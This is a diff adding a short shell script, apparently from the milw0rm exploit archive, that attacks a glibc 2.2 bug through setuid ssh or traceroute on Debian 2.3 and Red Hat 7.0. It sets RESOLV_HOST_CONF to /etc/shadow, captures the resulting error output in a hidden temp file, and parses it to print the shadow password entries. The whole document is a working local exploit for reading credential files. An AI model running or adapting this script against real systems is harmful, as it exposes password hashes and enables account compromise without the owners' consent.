@@ -1,0 +1,32 @@
+# Charles Stevenson <csteven@newhope.terraplex.com>
+# glibc-2.2 and openssh-2.3.0p1 (Debian 2.3 , Redhat 7.0)
+# This exploits is for glibc >= 2.1.9x.
+# (****krochos@linuxmail.org****)
+# Edit this if you have a problem with path
+
+ssh=/usr/bin/ssh
+traceroute=/usr/sbin/traceroute
+FILE=/etc/shadow        # File to read
+###############################################################################
+
+echo "$ssh"
+echo "[*] Checking permisions..."
+
+if [ ! -u $ssh ]; then
+        echo "$ssh is NOT setuid on this system or does not exist at all!"
+        if [ ! -u $traceroute ]; then
+          echo "$traceroute is NOT setuid on this system or does not exist at all!"
+          exit 0
+        fi
+fi
+
+export RESOLV_HOST_CONF=$FILE
+
+echo "[*] Glibc bug found by Charles Stevenson <csteven@NEWHOPE.TERRAPLEX.COM>"
+echo "[*] krochos@linuxmail.org"
+sleep 1
+echo "[*] export  RESOLV_HOST_CONF=/etc/shadow"
+ssh lt 2>/tmp/.resolv
+cat /tmp/.resolv |  cut -d"\`" -f5,2 | awk -F"\'" '{print $1} '
+
+# milw0rm.com [2001-01-25]
